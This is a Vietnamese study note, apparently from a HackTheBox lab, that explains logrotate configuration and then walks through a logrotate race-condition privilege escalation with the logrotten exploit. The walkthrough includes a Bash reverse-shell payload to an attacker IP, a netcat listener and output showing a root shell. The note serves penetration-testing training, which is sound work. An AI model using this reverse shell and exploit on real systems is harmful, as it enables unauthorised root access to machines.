Mọi hệ thống Linux đều tạo ra một lượng lớn các file log. Để ngăn chặn ổ đĩa đầy, một công cụ có tên `logrotate` chịu trách nhiệm lưu trữ hoặc loại bỏ các log cũ. Nếu không chú ý đến các file log, chúng sẽ ngày càng lớn và cuối cùng chiếm toàn bộ dung lượng ổ đĩa khả dụng. Ngoài ra việc tìm kiếm thông trong nhiều file log có kích thước lớn cũng tốn nhiều thời gian. Để ngăn chặn vấn đề này và tiết kiệm dung lượng ổ đĩa, `logrotate` được phát triển. Các log trong `/var/log` cung cấp cho quản trị viên những thông tin cần thiết để xác định nguyên nhân gây ra các sự cố. Quan trọng hơn nữa là những thông tin chi tiết về hệ thống mà đôi khi không được chú ý, chẳng hạn như tất cả các service có đang hoạt động chính xác hay không.
`Logrotate` cung cấp nhiều tính năng để quản lý các file log này. Trong đó bao gồm việc xác định:
- `size` của file log
- `age` của file log
- `action` sẽ được thực hiện khi một trong các điều kiện trên đạt đến ngưỡng được xác định
![[Pasted image 20260910211514.png]]
Chức năng chính của rotation là đổi tên các file log. Ví dụ, các file log mới có thể được tạo cho mỗi ngày mới, trong khi những file log cũ hơn sẽ được tự động đổi tên. Một ví dụ khác là làm trống file log cũ nhất để giảm mức tiêu thụ dung lượng.
Công cụ này thường được khởi chạy định kỳ thông qua `cron` và được điều khiển bởi file cấu hình `/etc/logrotate.conf`. File này chứa các thiết lập global quyết định cách thức hoạt động của `logrotate`:

```shell
w3bis2bi@htb[/htb]$ cat /etc/logrotate.conf

# see "man logrotate" for details
# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

Để ép buộc `logrotate` thực hiện xoay vòng log trong cùng một ngày mà không cần chờ lịch trình, chúng ta có thể chỉnh sửa lại mốc thời gian sau các file log cụ thể trong tệp trạng thái `/var/lib/logrotate.status` hoặc sử dụng tùy chọn `-f`/`--force`:

```shell
w3bis2bi@htb[/htb]$ sudo cat /var/lib/logrotate.status

"/var/log/samba/log.smbd" 2022-8-3
"/var/log/mysql/mysql.log" 2022-8-3
```

Các cấu hình xoay vòng log riêng biệt cho từng gói hoặc dịch vụ cụ thể nằm trong thư mục `/etc/logrotate.d/`:

```shell
w3bis2bi@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

Kiểm tra cấu hình mẫu của một dịch vụ (ví dụ `dpkg`):

```shell
w3bis2bi@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
	monthly
	rotate 12
	compress
	delaycompress
	missingok
	notifempty
	create 644 root root
}
```

## Logrotate Privilege Escalation

Để có thể khai thác `logrotate` nhằm leo thang đặc quyền, hệ thống mục tiêu cần thỏa mãn các điều kiện tiên quyết sau:
- Chúng ta phải có **quyền ghi (write permissions)** trên các file log hoặc thư mục chứa file log đó.
- `logrotate` phải được chạy dưới quyền của một tài khoản đặc quyền hoặc `root` (thông qua Cron job).
- Phiên bản `logrotate` thuộc các bản tồn tại lỗ hổng race condition:
  - `3.8.6`
  - `3.11.0`
  - `3.15.0`
  - `3.18.0`

Khai thác lỗ hổng này có thể thực hiện thông qua công cụ có sẵn mang tên **[logrotten](https://github.com/whotwagner/logrotten)**. Chúng ta có thể clone mã nguồn và biên dịch trực tiếp trên target system:

```shell
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

#### 1. Chuẩn bị Payload
Tạo tệp payload sẽ được thực thi khi rotation diễn ra. Trong ví dụ này, chúng ta sử dụng một reverse shell one-liner bằng Bash trỏ về IP và port của máy tấn công:

```shell
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

#### 2. Xác định cấu hình Rotation
Trước khi chạy exploit, cần xác định xem `logrotate.conf` đang sử dụng tùy chọn `create` hay `compress`:

```shell
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

Do hệ thống đang kích hoạt tùy chọn `create`, chúng ta sẽ sử dụng chế độ tương ứng của `logrotten`.

#### 3. Khởi tạo Listener và Thực thi Exploit
Mở một netcat listener trên máy tấn công:

```shell
w3bis2bi@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

Thực thi `logrotten` với payload đã chuẩn bị và chỉ định tệp log mục tiêu (ví dụ `/tmp/tmp.log`):

```shell
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

Khi cron job kích hoạt `logrotate` xoay vòng tệp log trên với quyền root, exploit sẽ can thiệp và thực thi payload, trả về một reverse shell với quyền `root` trên listener của chúng ta:

```shell
Listening on 0.0.0.0 9001
Connection received on 10.129.24.11 49818

# id
uid=0(root) gid=0(root) groups=0(root)
```


![[Pasted image 20260910213602.png]]

![[Pasted image 20260910213638.png]]

![[Pasted image 20260910213739.png]]

![[Pasted image 20260910213953.png]]

![[Pasted image 20260910214011.png]]

![[Pasted image 20260910214412.png]]

![[Pasted image 20260910215926.png]]

![[Pasted image 20260910215943.png]]